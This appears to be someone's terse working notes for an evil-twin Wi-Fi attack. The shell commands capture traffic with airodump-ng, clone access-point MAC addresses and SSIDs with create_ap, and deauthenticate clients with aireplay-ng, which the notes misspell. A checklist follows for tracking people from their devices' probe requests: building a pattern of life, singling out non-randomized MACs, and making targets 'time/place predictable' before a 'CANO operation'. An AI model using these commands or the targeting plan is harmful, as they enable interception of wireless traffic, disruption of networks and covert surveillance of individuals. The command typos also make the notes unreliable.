cd /opt 
sudo apt install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables

#now after finding prob, set card to mon master
## Step 1, capture traffic
sudo airodump-ng -c 11 --bssid <rogue mac> -w capture wlan1
sudo create_ap -w 2 -c 6 --mac 00:c0:ca:b4:62:34 --freq-band 2.4 wlx00c0cab46234 wlo1 Lab_7 TESTTEST --no-virt
sudo create_ap -w 2 -c 6 --mac 80:DA:C2:F8:B3:E8 --freq-band 2.4 wlx00c0cab46234 wlo1 denoooo TESTTEST --no-virt

sudo create_ap -w wpa2 -c 2 --mac 00:c0:ca:b4:62:34 --freq-band 2.4 wlx00c0cab46234 wlo1 TOPHAT14 --no-virt
##Step 3 Jam the true AP or deauth a client
sudo airreplay-ng -O 1 -a AP_MAC -c cient_MAC wlan1

###########
# Sort by probbing GO TO SSID tab
1. see a site or target
2. Look for probs, look at uptime to create a POL
3. compile list of devices and capabilities
    a. non-randomized macs, and intel macbooks
    b. create a bucket of data and look for that data in other place
        b1. make them time/place predictable
####
1. Survey
2. Wigile
3. Build Targets
4. Find location
5. Passive collect
6. find targets
7. plan POL for targets
8. conduct CANO operation